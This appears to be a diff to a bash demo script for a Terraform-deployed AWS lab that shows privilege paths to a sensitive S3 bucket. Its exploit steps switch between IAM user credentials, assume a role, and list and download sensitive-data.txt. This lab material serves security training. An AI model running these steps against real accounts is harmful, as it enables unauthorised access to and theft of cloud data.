@@ -28,12 +28,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -99,6 +101,15 @@ if [ "$USER1_ACCESS_KEY_ID" == "null" ] || [ -z "$USER1_ACCESS_KEY_ID" ]; then
     exit 1
 fi
 
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
 # Get region from Terraform
 AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
 
@@ -113,34 +124,48 @@ echo "  - User 2: $USER2_NAME"
 echo "  - Role 3: $ROLE3_NAME"
 echo "  - Bucket: $BUCKET_NAME"
 echo "  - Region: $AWS_REGION"
+echo "  ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
 echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
 
 # Navigate back to scenario directory
 cd - > /dev/null
 
-# Get account ID (we'll use user1's credentials initially)
-export AWS_ACCESS_KEY_ID=$USER1_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$USER1_SECRET_ACCESS_KEY
-export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
+# Credential switching helpers
+use_user1_creds() {
+    export AWS_ACCESS_KEY_ID="$USER1_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$USER1_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_user2_creds() {
+    export AWS_ACCESS_KEY_ID="$USER2_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$USER2_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
 
-show_cmd "aws sts get-caller-identity --query 'Account' --output text"
+# [OBSERVATION] Step 2: Get account ID using readonly credentials
+echo -e "${YELLOW}Step 2: Getting account ID${NC}"
+use_readonly_creds
+export AWS_REGION=$AWS_REGION
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
-echo ""
+echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 
 echo -e "${BLUE}========================================${NC}"
 echo -e "${BLUE}PATH 1: Direct S3 Access (user1)${NC}"
 echo -e "${BLUE}========================================${NC}\n"
 
-# Step 2: Verify user1 identity
-echo -e "${YELLOW}Step 2: Verifying user1 identity${NC}"
-export AWS_ACCESS_KEY_ID=$USER1_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$USER1_SECRET_ACCESS_KEY
+# [EXPLOIT] Step 3: Verify user1 identity
+echo -e "${YELLOW}Step 3: Verifying user1 identity${NC}"
+use_user1_creds
 export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
 
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -150,11 +175,12 @@ if [[ ! $CURRENT_USER == *"$USER1_NAME"* ]]; then
 fi
 echo -e "${GREEN}✓ Verified user1 identity${NC}\n"
 
-# Step 3: List S3 buckets with user1
-echo -e "${YELLOW}Step 3: Listing S3 buckets with user1 (direct access)${NC}"
+# [EXPLOIT] Step 4: List S3 buckets with user1
+echo -e "${YELLOW}Step 4: Listing S3 buckets with user1 (direct access)${NC}"
+use_user1_creds
 echo "Attempting to list all S3 buckets..."
 
-show_cmd "aws s3 ls"
+show_cmd "Attacker" "aws s3 ls"
 if aws s3 ls 2>/dev/null | head -5; then
     echo -e "${GREEN}✓ Successfully listed buckets${NC}"
 else
@@ -162,13 +188,14 @@ else
 fi
 echo ""
 
-# Step 4: Access the sensitive bucket directly with user1
-echo -e "${YELLOW}Step 4: Accessing sensitive bucket with user1 (direct access)${NC}"
+# [EXPLOIT] Step 5: Access the sensitive bucket directly with user1
+echo -e "${YELLOW}Step 5: Accessing sensitive bucket with user1 (direct access)${NC}"
+use_user1_creds
 echo "Bucket: $BUCKET_NAME"
 echo ""
 
 echo "Listing objects in the sensitive bucket..."
-show_attack_cmd "aws s3 ls \"s3://$BUCKET_NAME/\""
+show_attack_cmd "Attacker" "aws s3 ls \"s3://$BUCKET_NAME/\""
 if aws s3 ls "s3://$BUCKET_NAME/" 2>/dev/null; then
     echo -e "${GREEN}✓ Successfully listed objects in bucket${NC}"
 else
@@ -178,7 +205,7 @@ fi
 echo ""
 
 echo "Downloading sensitive-data.txt..."
-show_attack_cmd "aws s3 cp \"s3://$BUCKET_NAME/sensitive-data.txt\" /tmp/sensitive-user1.txt"
+show_attack_cmd "Attacker" "aws s3 cp \"s3://$BUCKET_NAME/sensitive-data.txt\" /tmp/sensitive-user1.txt"
 if aws s3 cp "s3://$BUCKET_NAME/sensitive-data.txt" /tmp/sensitive-user1.txt 2>/dev/null; then
     echo -e "${GREEN}✓ Successfully downloaded file${NC}"
     echo ""
@@ -196,14 +223,12 @@ echo -e "${BLUE}========================================${NC}"
 echo -e "${BLUE}PATH 2: Indirect S3 Access (user2 → role3)${NC}"
 echo -e "${BLUE}========================================${NC}\n"
 
-# Step 5: Switch to user2 and verify identity
-echo -e "${YELLOW}Step 5: Switching to user2 credentials${NC}"
-export AWS_ACCESS_KEY_ID=$USER2_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$USER2_SECRET_ACCESS_KEY
+# [EXPLOIT] Step 6: Switch to user2 and verify identity
+echo -e "${YELLOW}Step 6: Switching to user2 credentials${NC}"
+use_user2_creds
 export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
 
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -213,11 +238,12 @@ if [[ ! $CURRENT_USER == *"$USER2_NAME"* ]]; then
 fi
 echo -e "${GREEN}✓ Verified user2 identity${NC}\n"
 
-# Step 6: Verify user2 lacks direct bucket access
-echo -e "${YELLOW}Step 6: Verifying user2 lacks direct bucket access${NC}"
+# [EXPLOIT] Step 7: Verify user2 lacks direct bucket access
+echo -e "${YELLOW}Step 7: Verifying user2 lacks direct bucket access${NC}"
+use_user2_creds
 echo "Attempting to access bucket directly (should fail)..."
 
-show_cmd "aws s3 ls \"s3://$BUCKET_NAME/\""
+show_cmd "Attacker" "aws s3 ls \"s3://$BUCKET_NAME/\""
 if aws s3 ls "s3://$BUCKET_NAME/" 2>/dev/null; then
     echo -e "${RED}⚠ Unexpectedly have direct bucket access${NC}"
 else
@@ -225,11 +251,12 @@ else
 fi
 echo ""
 
-# Step 7: Assume role3 with user2
-echo -e "${YELLOW}Step 7: Assuming role3 with user2 credentials${NC}"
+# [EXPLOIT] Step 8: Assume role3 with user2
+echo -e "${YELLOW}Step 8: Assuming role3 with user2 credentials${NC}"
+use_user2_creds
 echo "Role ARN: $ROLE3_ARN"
 
-show_attack_cmd "aws sts assume-role --role-arn $ROLE3_ARN --role-session-name demo-session --query 'Credentials' --output json"
+show_attack_cmd "Attacker" "aws sts assume-role --role-arn $ROLE3_ARN --role-session-name demo-session --query 'Credentials' --output json"
 CREDENTIALS=$(aws sts assume-role \
     --role-arn $ROLE3_ARN \
     --role-session-name demo-session \
@@ -247,18 +274,18 @@ export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
 export AWS_REGION=$AWS_REGION
 
 # Verify we assumed the role
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $ROLE_IDENTITY"
 echo -e "${GREEN}✓ Successfully assumed role3${NC}\n"
 
-# Step 8: Access bucket with role3
-echo -e "${YELLOW}Step 8: Accessing sensitive bucket with role3 (indirect access)${NC}"
+# [EXPLOIT] Step 9: Access bucket with role3
+echo -e "${YELLOW}Step 9: Accessing sensitive bucket with role3 (indirect access)${NC}"
 echo "Bucket: $BUCKET_NAME"
 echo ""
 
 echo "Listing objects in the sensitive bucket..."
-show_attack_cmd "aws s3 ls \"s3://$BUCKET_NAME/\""
+show_attack_cmd "Attacker" "aws s3 ls \"s3://$BUCKET_NAME/\""
 if aws s3 ls "s3://$BUCKET_NAME/" 2>/dev/null; then
     echo -e "${GREEN}✓ Successfully listed objects in bucket${NC}"
 else
@@ -268,7 +295,7 @@ fi
 echo ""
 
 echo "Downloading sensitive-data.txt..."
-show_attack_cmd "aws s3 cp \"s3://$BUCKET_NAME/sensitive-data.txt\" /tmp/sensitive-role3.txt"
+show_attack_cmd "Attacker" "aws s3 cp \"s3://$BUCKET_NAME/sensitive-data.txt\" /tmp/sensitive-role3.txt"
 if aws s3 cp "s3://$BUCKET_NAME/sensitive-data.txt" /tmp/sensitive-role3.txt 2>/dev/null; then
     echo -e "${GREEN}✓ Successfully downloaded file${NC}"
     echo ""
